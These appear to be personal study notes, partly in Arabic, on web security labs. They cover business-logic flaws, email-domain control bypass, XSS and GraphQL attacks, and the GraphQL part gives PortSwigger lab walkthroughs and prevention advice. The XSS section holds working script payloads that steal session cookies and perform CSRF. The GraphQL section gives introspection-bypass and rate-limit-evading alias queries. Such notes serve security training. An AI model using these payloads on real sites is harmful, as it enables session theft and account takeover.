## التعامل مع المدخلات غير التقليدية

في هذا السيناريو، يتعين على التطبيق التحقق من المدخلات التي قد لا تكون مناسبة لمنطق الأعمال، مثل الأرقام السالبة أو المدخلات الكبيرة جدًا أو المدخلات الطويلة بشكل غير متوقع.

### خطوات الهجوم:

1. **إدخال قيم غير متوقعة** مثل القيم السالبة أو الكبيرة جدًا (مثال: محاولة شراء كميات سلبية من المنتجات أو كميات أكبر مما هو متاح).
2. **مراقبة استجابة التطبيق**. قد يؤدي هذا إلى سلوك غير متوقع مثل منح خصومات غير مبررة أو تغيير الكميات أو الأسعار بطريقة غير صحيحة.

### مثال:

- السماح بشراء كمية سلبية من منتج لتقليل السعر الإجمالي.

## ثغرة في منطق التحقق من الرصيد

يظهر هذا السيناريو عندما لا يتحقق التطبيق بشكل صحيح من الرصيد أو القيود المالية، مثل السماح بتحويل مبالغ سالبة بين الحسابات.

### خطوات الهجوم:

1. **إرسال قيمة سالبة** في حقل التحويل المالي.
2. **مراقبة ما إذا كان التطبيق يسمح بتحويل الأموال** في الاتجاه المعاكس أو السماح بالتحويل بدون التأكد من كفاية الرصيد.

### مثال:

- تحويل مبلغ سالب بين حسابات بنكية لإضافة أموال بدلاً من خصمها.

## استغلال ثغرة السعر

يتعلق هذا السيناريو باستغلال ثغرات في منطق التسعير الذي يسمح للمهاجم بشراء المنتجات بسعر أقل من المطلوب.

### خطوات الهجوم:

1. **استخدام Burp Intruder** لإرسال عدد كبير من الطلبات لتغيير كمية المنتجات في السلة.
2. **مراقبة استجابة التطبيق** لمعرفة ما إذا كانت الأسعار تتغير بشكل غير متوقع.

### مثال:

- شراء منتج بأسعار سلبية بعد تعديل كميات المنتجات بشكل غير متوقع.

## التسجيل باستخدام بيانات غير متوقعة

يتعلق هذا السيناريو باستغلال ثغرة في عملية تسجيل الحساب باستخدام بيانات مدخلات طويلة جدًا تتجاوز الحد المتوقع من التطبيق.

### خطوات الهجوم:

1. **التسجيل باستخدام عنوان بريد إلكتروني طويل للغاية** للتلاعب في كيفية تعامل التطبيق مع المدخلات.
2. **مراقبة رد الفعل** لمعرفة ما إذا تم تقطيع البيانات بشكل غير متوقع، مما يؤدي إلى الحصول على صلاحيات غير مقصودة (مثل الوصول إلى لوحة الإدارة).

### مثال:

- التسجيل باستخدام عنوان بريد إلكتروني طويل للحصول على حقوق إدارية بسبب قصر عملية التحقق من المدخلات.

## **Inconsistent security controls**

في هذا السيناريو، الثغرة تتعلق بأن **التحقق من البريد الإلكتروني** للوصول إلى لوحة الإدارة يتم فقط أثناء التسجيل، ولكن لا يتم تطبيقه عندما يقوم المستخدمون بتغيير بريدهم الإلكتروني لاحقًا.

- 
    - قم بتسجيل حساب مستخدم عادي باستخدام أي بريد إلكتروني عشوائي (مثل `user@random.com`).
    - قم بتأكيد البريد الإلكتروني عن طريق النقر على الرابط في البريد الإلكتروني المرسل من التطبيق.
- **تجاوز التحكم الأمني**
    - بعد التسجيل، انتقل إلى إعدادات الحساب وقم بتغيير عنوان البريد الإلكتروني المسجل إلى عنوان بريد إلكتروني يحتوي على نطاق `dontwannacry.com`.
    - على سبيل المثال، قم بتغييره إلى `attacker@dontwannacry.com`.
- **الوصول غير المصرح به**
    - التطبيق يفشل في التحقق من نطاق البريد الإلكتروني بشكل صحيح بعد التغيير، مما يمنح الوصول إلى لوحة الإدارة.
    - الآن يمكن للمهاجم الوصول إلى وظائف حساسة مثل حذف المستخدمين.

# **Cross-site scripting (XXS)**

## **Exploiting cross-site scripting to steal cookies**

<script>

window.addEventListener('DOMContentLoaded', function() {

var token = document.getElementsByName('csrf')[0].value

var data = new FormData();

data.append('csrf', token);

data.append('postId', 8);

data.append('comment', document.cookie);

data.append('name', 'victim');

data.append('email', 'blah@email.com');

data.append('website', 'http://blah.com');

fetch('/post/comment', {

method: 'POST',

mode: 'no-cors',

body: data

});

});

</script>

## **Exploiting XSS to perform CSRF**

<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
var changeReq = new XMLHttpRequest();
changeReq.open('post', '/my-account/change-email', true);
changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

# **DOM-based**

# **JWT**

# X-PATH **Injection**

 XML Path Language

# **GraphQL API vulnerabilities**

- GraphQL APIs use the same endpoint for all requests.
- send `query{__typename}` it will include the string `{"data": {"__typename": "query"}}` somewhere in its response.
    - The query works because every GraphQL endpoint has a reserved field called `__typename` that returns the queried object's type as a string.
- common GraphQL endpoints:
    - `/graphql`
    - `/api`
    - `/api/graphql`
    - `/graphql/api`
    - `/graphql/graphql`
    - try appending `/v1`
- test using different request methods POST or GET.
- try resending the universal query using alternative HTTP methods.

## Exploiting unsanitized arguments

For example, the query below requests a product list for an online shop:

`#Example product query query { products { id name listed } }`

The product list returned contains only listed products.

`#Example product response { "data": { "products": [ { "id": 1, "name": "Product 1", "listed": true }, { "id": 2, "name": "Product 2", "listed": true }, { "id": 4, "name": "Product 4", "listed": true } ] } }`

From this information, we can infer the following:

- Products are assigned a sequential ID.
- Product ID 3 is missing from the list, possibly because it has been delisted.

By querying the ID of the missing product, we can get its details, even though it is not listed on the shop and was not returned by the original product query.

```
// Query to get missing product
query {
	product(id: 3) {
		id
		name
		listed
	}
}` `
#Missing product response
{
	"data": {
		"product": {
			"id": 3,
			"name": "Product 3",
			"listed": no
		}
	}
}`

```

## Discovering schema information

- use introspection queries
- `__schema` discover schema information
- If introspection is enabled, the response returns the **names** of all available queries.
    - `#Introspection probe request { "query": "{__schema{queryType{name}}}" }`
- The example query below returns full details on all queries, mutations, subscriptions, types, and fragments.

```
#Full introspection query
query IntrospectionQuery {
__schema {
	queryType {
		name
	} mutationType {
		name
	}
	subscriptionType {
		name
	}
	types {
		...FullType
	}
	directives {
		 name
		 description
		 args {
		  ...InputValue
		  }
	 onOperation #Often needs to be deleted to run query
	 onFragment #Often needs to be deleted to run query
	 onField #Often needs to be deleted to run query
	  }
	}
}
fragment FullType on __Type {
	kind
	name
	description
	fields(includeDeprecated: true) {
		name
		description
		args {
			...InputValue
		}
		type {
			...TypeRef
		}
		isDeprecated
		deprecationReason
	}
	inputFields {
		...InputValue
	}
	interfaces {
		...TypeRef
	}
	enumValues(includeDeprecated: true) {
		name
		description
		isDeprecated
		deprecationReason
	}
	possibleTypes {
		...TypeRef
	}
}
fragment InputValue on __InputValue {
	name
	description
	type {
		...TypeRef
	}
	defaultValue
}
fragment TypeRef on __Type {
	kind
	name
	ofType {
		kind
		name
		ofType {
		kind
		name
		ofType {
		kind name
		}
	}
}
}

```

If introspection is enabled but the above query doesn't run, try removing the `onOperation`, `onFragment`, and `onField` directives from the query structure. Many endpoints do not accept these directives as part of an introspection query, and you can often have more success with introspection by removing them.

## Bypassing GraphQL introspection defenses

- If you cannot get introspection queries, try inserting a special character after the `__schema` keyword.
- try characters like spaces, new lines and commas, as they are ignored by GraphQL but not by flawed regex.
- try running the probe over an alternative request method.
- or a POST request with a content-type of `x-www-form-urlencoded`.

The example below shows an introspection probe sent via GET, with URL-encoded parameters.
`# Introspection probe as GET request GET /graphql?query=query%7B__schema%0A%7BqueryType%7Bname%7D%7D%7D`

## Bypassing rate limiting using aliases

- **aliased queries**.
- This operation could potentially bypass rate limiting as it is a single HTTP request.
- It could potentially be used to check a vast number of discount codes at once.

```
#Request with aliased queries
query isValidDiscount($code: Int) {
	isvalidDiscount(code:$code){
		valid
	}
	isValidDiscount2:isValidDiscount(code:$code){
		valid
	}
	isValidDiscount3:isValidDiscount(code:$code){
		valid
	}
}

```

## GraphQL CSRF

- where a GraphQL endpoint does not validate the **content type** of the requests sent to it and no **CSRF tokens** are implemented.
- The steps to construct a CSRF attack and deliver an exploit are the same for **GraphQL-based CSRF** vulnerabilities as they are for "regular" CSRF vulnerabilities
- POST requests that use a content type of `application/json` are **secure** against forgery as long as the **content type** is **validated**.
- alternative methods such as **GET**, or any request that has a content type of `x-www-form-urlencoded`, can be sent by a browser and so may leave users vulnerable to attack if the endpoint **accepts** these requests.

## Preventing GraphQL attacks

- disable introspection on it. ( to disable introspection in the Apollo GraphQL platform, see this blog post.)
- if you need to leave introspection enabled, you should review the API's schema to make sure that it does not expose unintended fields to the public.
- Make sure that suggestions are disabled. (You cannot disable suggestions directly in Apollo.)
- Make sure that your API's schema does not expose any private user fields.

### Preventing GraphQL brute force attacks

- Limit the query depth of your API's queries.
    - The term "query depth" refers to the number of levels of nesting within a query.
    - Heavily-nested queries can have significant performance implications, and can potentially provide an opportunity for DoS attacks if they are accepted.
    - By limiting the query depth your API accepts, you can reduce the chances of this happening.
- Configure operation limits.
    - Operation limits enable you to configure the maximum number of unique fields, aliases, and root fields that your API can accept.
- Configure the maximum amount of bytes a query can contain.
- Consider implementing cost analysis on your API.
    - Cost analysis is a process whereby a library application identifies the resource cost associated with running queries as they are received.
    - If a query would be too computationally complex to run, the API drops it.

### Preventing CSRF over GraphQL

- Your API only accepts queries over JSON-encoded POST.
- The API validates that content provided matches the supplied content type.
- The API has a secure CSRF token mechanism.

## Tools

1. [graphql-visualizer](http://nathanrandal.com/graphql-visualizer/)
2. [clairvoyance](https://github.com/nikitastupin/clairvoyance)

## Portswigger Labs

### First Lab

1. find the right GraphQL Endpoint
2. then add the introspection and hit send.
3. take the response to the graphql-visualizer website.
4. notice an interesting parameter called `postPassword`
5. add it beside other parameters to see it in the response.
6. then add the hidden id: 3 to get the password.

### Second Lab

1. go to my account and try to login.
2. go to burp history to find the graphql/v1 send it to repeater
3. then add the introspection and send it.
4. add the response to the visualizer but notice nothing interesting appeared.
5. next approach is to `save the graphql queries to sitemap` in burpsuite
6. then go to target and investigate the queries to see the getUser query.
7. send it to repeater and change the id in variables tab to 1 and send it
8. to get administrator and his password

### Third Lab

1. find the hidden endpoint through the common api endpoints list.
2. send the introspection payload and notice in the response that it is not allowed.
3. try different bypass techniques mentioned above (it will the newline).
4. save it to target sitemap and visit it in burp.
5. notice getUser endpoint use it to get the id for username carlos (3).
6. the other endpoint is to delete the username of the id use it to delete user carlos

### Fourth Lab

1. get the graphQL endpoint by trying to login as carlos
2. send it to repeater an put the introspection payload and nothing interesting appeared.
3. there is a rate limit here so we need to bypass it to enumerate the login function with aliases.
4. to make the process faster open the tip of the lab and copy the script put it in the console.
5. then paste the result into repeater under login function.
6. don't forget to remove the variables in the login parameters to avoid any errors.
7. notice in response the success true then go to your payload to see which password is correct.
8. then login with carlos and the resulted password to solve the lab.

### Fifth Lab

1. first access the lab then sign in with wiener:peter.
2. then change your email and go to burp history and send the POST request to repeater.
3. notice that we need to see if it validate using the session cookie or not by entering different email and send it.
4. and it worked.
5. second step to see if it validate by the content-type be vulnerable to CSRF.
6. change the application/json to x-www-form-urlencoded.
7. then take the query to change its format to work with the x-www-form-urlencoded and paste it to chatgpt to convert it.
8. take the resulted query and paste it in the request then send it.
9. notice it worked just fine.
10. then generate CSRF POC and change the email in the POC.
11. then paste it in the exploit server and save then send to the victim.


